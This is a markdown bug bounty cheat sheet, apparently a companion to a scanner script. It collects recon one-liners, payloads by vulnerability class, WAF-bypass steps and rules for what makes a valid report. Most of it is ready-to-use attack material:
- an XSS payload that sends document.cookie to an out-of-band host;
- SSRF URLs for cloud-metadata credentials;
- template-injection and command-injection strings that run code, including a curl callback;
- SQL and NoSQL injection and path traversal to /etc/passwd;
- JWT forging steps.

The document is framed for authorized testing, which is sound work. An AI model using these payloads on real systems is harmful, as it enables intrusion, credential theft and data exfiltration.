# 🧰 Bug Bounty Arsenal

Curated payloads, oneliners, tactics, WAF-bypass order, and the submission rules
that keep your signal ratio clean. Pairs with `bounty_recon.py` — the scanner
finds the surface, this tells you how to turn it into a **reportable** bug.

> ⚠️ Authorized targets only. Every "blind" primitive needs out-of-band (OOB)
> confirmation before you believe it. **No demonstrated impact = not a report.**

---

## 0. Resource Index — the sources worth your time

Rather than "every" repo/blog (most are copies), these are the primary sources
the top hunters actually use:

**Methodology & learning**
- PortSwigger Web Security Academy — https://portswigger.net/web-security (free labs, the gold standard)
- Jason Haddix — *The Bug Hunter's Methodology (TBHM)* — recon + mindset
- NahamSec — `nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters`
- HackTricks — https://book.hacktricks.xyz (technique encyclopedia)
- OWASP Web Security Testing Guide (WSTG) & API Security Top 10

**Payloads & cheatsheets**
- PayloadsAllTheThings — `swisskyrepo/PayloadsAllTheThings`
- SecLists (wordlists) — `danielmiessler/SecLists`
- EdOverflow — `EdOverflow/bugbounty-cheatsheet`
- KingOfBugBounty — `KingOfBugbounty/KingOfBugBountyTips` (oneliners)

**Write-ups / what's actually being found**
- Pentester Land — https://pentester.land/writeups/ (indexed bug bounty writeups)
- HackerOne Hacktivity — https://hackerone.com/hacktivity (disclosed reports)
- Reddit — r/bugbounty, r/netsec
- Intigriti / YesWeHack / Bugcrowd blogs (new techniques, VRT)

**Core tooling (ProjectDiscovery + tomnomnom + friends)**
- ProjectDiscovery: `subfinder`, `httpx`, `nuclei`, `naabu`, `katana`, `dnsx`, `interactsh`
- tomnomnom: `gf`, `waybackurls`, `anew`, `qsreplace`, `unfurl`, `httprobe`
- `lc/gau`, `ffuf`, `hahwul/dalfox`, `s0md3v/Arjun`, `devanshbatham/ParamSpider`
- `trufflesecurity/trufflehog`, `gitleaks`, `owasp-amass/amass`, `ghauri`, `sqlmap`

---

## 1. Recon Oneliners (the proven pipelines)

```bash
# Subdomains → live → nuclei (the classic triage pipe)
subfinder -d target.com -all -silent | httpx -silent | nuclei -severity critical,high,medium

# Full passive URL harvest → dedupe → interesting params
echo target.com | gau --threads 10 | anew urls.txt
cat urls.txt | gf xss  | qsreplace '"><svg onload=confirm(1)>' | anew xss-candidates.txt
cat urls.txt | gf ssrf | qsreplace 'http://OOB.interactsh.com' | anew ssrf-candidates.txt
cat urls.txt | gf redirect | qsreplace 'https://evil.com' | anew redirect-candidates.txt

# Reflected-param hunting with a unique marker (no false "reflection")
m=$(head -c 9 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9'); \
  cat urls.txt | qsreplace "$m" | httpx -silent -mr "$m"

# XSS at scale (confirmed sinks only)
cat xss-candidates.txt | dalfox pipe --skip-bav -o dalfox.txt

# JS secrets / endpoints
echo target.com | gau | grep '\.js$' | httpx -silent \
  | xargs -I{} sh -c 'curl -s {} | grep -aoE "(api[_-]?key|secret|token)[\"'\'' :=]+[A-Za-z0-9._-]{12,}"'

# Content discovery
ffuf -u https://target.com/FUZZ -w SecLists/Discovery/Web-Content/raft-medium-words.txt -mc all -fc 404 -t 50

# Parameter discovery on a single endpoint
arjun -u https://target.com/api/item -m GET

# Git / secret sweep of an org
trufflehog github --org=TARGET-ORG --only-verified

# Takeover check across all subs
subfinder -d target.com -silent | httpx -silent | nuclei -t http/takeovers/

# Feed everything into this repo's scanner for scoring + exploitation plans
python3 bounty_recon.py -t target.com --profile safe --ai-triage --html --out-dir ./reports
```

---

## 2. Payloads by Class

### XSS
```html
<!-- probes -->
"><script>alert(document.domain)</script>
'><img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
javascript:alert(document.domain)
<!-- impact proof (exfil, not alert) -->
<img src=x onerror="fetch('https://OOB?c='+btoa(document.cookie))">
<!-- CSP bypass: Angular template injection -->
{{constructor.constructor('alert(1)')()}}
<!-- polyglot -->
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>
```
DOM sinks to grep in JS: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout("...")`, `new Function`, `location.href=`, `element.src=` fed from `location.hash/search/href`, `document.referrer`, `window.name`.

### SSRF — cloud metadata
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token   # GCP (hdr: Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2021-02-01     # Azure (hdr: Metadata: true)
# IP-filter bypass → all = 127.0.0.1
http://2130706433  http://0177.0.0.1  http://127.1  http://[::1]  http://[::ffff:127.0.0.1]
# internal services
http://localhost:6379 (Redis)  :9200 (Elastic)  :2375 (Docker API /containers/json)
```

### SQLi
```sql
'  ''  ' OR 1=1--  ' UNION SELECT NULL--
' AND SLEEP(5)--            -- MySQL
' AND pg_sleep(5)--         -- PostgreSQL
'; WAITFOR DELAY '0:0:5'--  -- MSSQL
-- WAF: /*!50000SELECT*/  SE/**/LECT  SeLeCt  %2527  (double-encode)
```

### NoSQL (MongoDB)
```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$regex":".*"},"password":{"$gt":""}}
```
```bash
# GET form variant
/login?username[$ne]=null&password[$ne]=null
```

### XXE
```xml
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<!-- blind OOB --><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://OOB/xxe">]>
<!-- SVG upload: <image href="file:///etc/passwd"/> -->
```

### SSTI (probe → engine → RCE)
```text
{{7*7}}→49 Jinja2/Twig   ${7*7}→Freemarker/Spring   <%= 7*7 %>→ERB/EJS   {{7*'7'}}→7777777 = Jinja2
Jinja2 RCE: {{cycler.__init__.__globals__.os.popen('id').read()}}
Freemarker: ${"freemarker.template.utility.Execute"?new()("id")}
ERB:        <%= `id` %>        EJS: <%= process.mainModule.require('child_process').execSync('id') %>
Thymeleaf:  ${T(java.lang.Runtime).getRuntime().exec('id')}
```

### Command injection
```bash
; id    | id    $(id)    `id`    && id    ; sleep 5
# OOB: ; curl https://OOB     $(nslookup OOB)
# space bypass: ;cat${IFS}/etc/passwd    keyword bypass: ;c'a't /etc/passwd
```

### Path traversal
```bash
../../../etc/passwd    ..%2F..%2F..%2Fetc%2Fpasswd    ..%252f..%252f (double)
....//....//etc/passwd    /etc/passwd%00.jpg
```

### IDOR / auth
```bash
GET /api/user/123 → 124            # numeric
PUT protected → DELETE unprotected # method swap
/v2/users/123 → /v1/users/123      # old version
/api/orders → /api/orders?user_id=456
# mass-assignment: {"role":"admin"} {"isAdmin":true} {"admin":1}
```

### JWT
```bash
# alg:none — set header alg "none", drop signature, edit sub/role, replay
# weak secret: hashcat -a 0 -m 16500 jwt.txt rockyou.txt   → forge
# RS256→HS256 key confusion: sign with the public key as HMAC secret
```

### OAuth
```text
redirect_uri swap → attacker host (steal code)  |  missing/static state → CSRF/account-link
no PKCE (no code_challenge accepted) → code interception
```

### Request smuggling (fingerprint front-end FIRST)
```http
CL.TE:  Content-Length: 13 + Transfer-Encoding: chunked, body "0\r\n\r\nSMUGGLED"
```
Burp → HTTP Request Smuggler → Smuggle probe. Note: classic CL.TE/TE.CL is dead on
Nginx≥1.21 / Envoy≥1.20; still works on HAProxy≤2.4, older F5/Citrix, ATS.

### WebSocket (CSWSH)
```bash
wscat -c "wss://target/ws" -H "Origin: https://evil.com"   # if accepted = CSWSH
```

---

## 3. WAF Bypass — try in this order
1. **Encoding** — case (`SeLeCt`), URL-encode ×1, ×2, Unicode `\u`, HTML entity `&#x3c;`.
2. **Parser quirks** — `Content-Type` confusion (json vs form), JSON `\u` mid-keyword, multipart boundary tricks, XML namespaces.
3. **Protocol** — HTTP/2 vs 1.1 (WAF may inspect only one), `X-Original-URL`, `X-Forwarded-*`.
4. **Vendor-specific** — Cloudflare/Akamai/Imperva/F5/AWS signature gaps.

Most engagements succeed at step 2 (WAF and origin disagree on what's "valid").

---

## 4. `gf` patterns (tomnomnom/gf)
```
gf xss | ssrf | idor | sqli | redirect | lfi | rce | ssti | debug_logic | secrets | cors | upload-fields
```

---

## 5. Discipline that prevents false positives
- **OOB-or-it-didn't-happen:** every blind bug (SQLi/XSS/SSRF/RCE/XXE) must fire a Burp Collaborator / interactsh callback before you believe it. A SQL-error string in a 500 can be an unrelated log.
- **Unique markers, never generic words:** search responses for a random token, not `javascript`/`admin` (those lie via keyword overlap).
- **Timing oracles need n≥10 interleaved trials + Welch t>3** — a single 129 ms delta is noise.

---

## 6. ⛔ Always Rejected — never submit standalone
Submitting these burns your signal ratio and invites N/A:

Missing CSP/HSTS/X-Frame-Options & other headers · missing SPF/DKIM/DMARC ·
GraphQL introspection alone · version/banner disclosure w/o working CVE ·
clickjacking on non-sensitive pages · tabnabbing · CSV injection · CORS `*`
without credentialed exfil PoC · logout CSRF · self-XSS · open redirect alone ·
SSRF with DNS callback only · host-header injection alone · rate-limit on
non-critical forms · session-not-invalidated-on-logout · internal IP in error ·
mixed content · weak TLS ciphers · missing HttpOnly/Secure alone · autocomplete on password.

*(`bounty_recon.py` marks these ⛔ NOT REPORTABLE ALONE automatically.)*

---

## 7. ✅ Conditionally Valid — requires a proven chain
| Standalone | + Chain | Result |
|---|---|---|
| Open redirect | OAuth code theft via redirect_uri | ATO (Critical) |
| Clickjacking | sensitive framable action + PoC | Medium |
| CORS wildcard | credentialed request exfils user data | High |
| CSRF | sensitive action (funds/email change) | High |
| Rate-limit bypass | OTP/token brute succeeds | Med/High |
| SSRF DNS-only | internal service access + data read | Medium |
| Host-header injection | password-reset email uses it | High |
| S3 listing | JS bundle → API keys/OAuth secrets | Med/High |
| Self-XSS | CSRF to trigger on victim | Medium |
| Subdomain takeover | OAuth redirect_uri at that subdomain | Critical |
| GraphQL introspection | auth-bypass mutation / node() IDOR | High |

**Rule:** build + confirm the chain end-to-end, *then* report. Never "A could chain with B" — prove it.

---

*Attribution: techniques here are public community knowledge (PortSwigger, PayloadsAllTheThings,
HackTricks, tomnomnom, ProjectDiscovery, OWASP, and disclosed HackerOne/Bugcrowd reports).
Use only where you are authorized.*
